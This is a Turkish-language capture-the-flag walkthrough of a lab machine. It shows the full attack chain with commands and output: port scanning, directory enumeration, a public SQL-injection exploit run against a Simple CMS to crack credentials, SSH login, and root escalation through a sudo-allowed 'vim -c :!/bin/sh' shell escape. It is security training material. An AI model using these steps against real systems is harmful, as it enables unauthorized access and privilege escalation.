Öncelikle bir rustscan taraması yapıldı. rustscan kullanma amacaım nmape göre bira daha hızlı olduğu için bunu tercih ettim ve sonrasında rustscanden aldığımız sonuçları nmape aktardık detaylıca analkiz etmek için

```bash
rustscan -a 10.10.137.100
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit
Open 10.10.137.100:21
Open 10.10.137.100:80
Open 10.10.137.100:2222

```
Rustscan çıktısında 21,80 ve 2222 portunun açık olduğıu gördük ve detaylı analiz için nmapte tarama yaptık

```bash
nmap -Pn -sV -A -p 21,80,2222 10.10.137.100
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 06:34 EDT
Nmap scan report for 10.10.137.100
Host is up (0.087s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.233.156
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 4.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.10 - 3.13 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   89.76 ms 10.21.0.1
2   90.82 ms 10.10.137.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.68 seconds

```
Nmap çıktısınıda analiz ettikten sonra robots.txt ve simple adında bir dizin görüypruz.sonrasında simple dizini içinde bir dirsearh atıyoruz ve çıktıya bakıyoruz

<img width="1920" height="1080" alt="dirsearch" src="https://github.com/user-attachments/assets/2c7fda46-8959-41f9-a377-06d803388253" />

dirsearchten aldığımz bilgilerle siteyi ziyaret ediyoruz.Login panelininde olduğunu görüo orayada bakıyoruz

<img width="1920" height="1080" alt="Screenshot_2025-07-29_07_06_43" src="https://github.com/user-attachments/assets/44732bf7-7558-4cbf-9eab-d1d2ee61d3ec" />

<img width="1920" height="1080" alt="Screenshot_2025-07-29_07_08_28" src="https://github.com/user-attachments/assets/1587ecf3-4fe4-4dd7-9bba-9f044d9783ea" />

Sonrasında Sİmple CMS ile ilgili bir şeyler öğrnemek için googluyoruz ve bir sqli açığı olduğpunu görüyoruz.

<img width="1920" height="1080" alt="Screenshot_2025-07-29_08_22_41" src="https://github.com/user-attachments/assets/c8b01c65-1556-47ab-8c83-0fd459278a0a" />

Sonrasında bu exploit kullanarak sistemi sömürüyoruz

```bash
python3 exploit.py -u http://<your_machine_ip>/simple --crack -w /usr/share/wordlists/rockyou.txt
```
<img width="1920" height="1080" alt="Screenshot_2025-07-29_06_54_15" src="https://github.com/user-attachments/assets/d393eff7-be58-4e24-bb36-574136ef1596" />

Ve bu sömürüden elde ettiğimz bilgiler ile 2222 portunda bulunan ssh servisine giriş yapıyoruz

<img width="1920" height="1080" alt="Screenshot_2025-07-29_06_55_10" src="https://github.com/user-attachments/assets/51409875-c56e-437a-a13a-dd3961fc81ec" />

Sonrasında ilk flagimiz olan user.txt bulup ookuyoruz.

```bash
$ ls
user.txt
$ cat user.txt
G00d xxx,xxxx xxx
$ 
```
Sonrasında sistemde başka dosya var mı diye bakıyoruz ve sunbath adında diğer dosyamızı görüyoruz bu da ctf çözümünde bize sorulan bir soruydu.

```bash
# cd /home
# ls
mitch  sunbath
# 
```
Sonrasında sistemde root haklarında çalıştırabildiğmiz komutları görmek için "sudo -l" komutunıu çalıştırıyoruz ve bir ayrıcalık görüyoruz.

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ 
```
vim komutunu root haklarında çalıştırabildiğmizi görüyoruz ve hemen gtfobins wevb sayfasını ziyaret ederek neler yapabileceğimize bakıyopruz.

<img width="1920" height="1080" alt="Screenshot_2025-07-29_06_57_41" src="https://github.com/user-attachments/assets/84744af3-3c84-493a-b025-ed01d3ca0905" />

ayrıcalık kodunu bulup çalıştırıyoruz ve root haklarına çıkmış oluyoruz ve kök bayrağımızı yakalıyoruz Ctfin sonuna geliyoruz
```bash
$ sudo vim -c ':!/bin/sh'
```

```bash
# ^[[2;2R
/bin/sh: 1: not found
/bin/sh: 1: 2R: not found
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# ls
user.txt
# d /root
/bin/sh: 5: d: not found
# cd /root
# ls
root.txt
# cat root.txt
W3ll xxxx. xxx xxxx xxx
# 
```






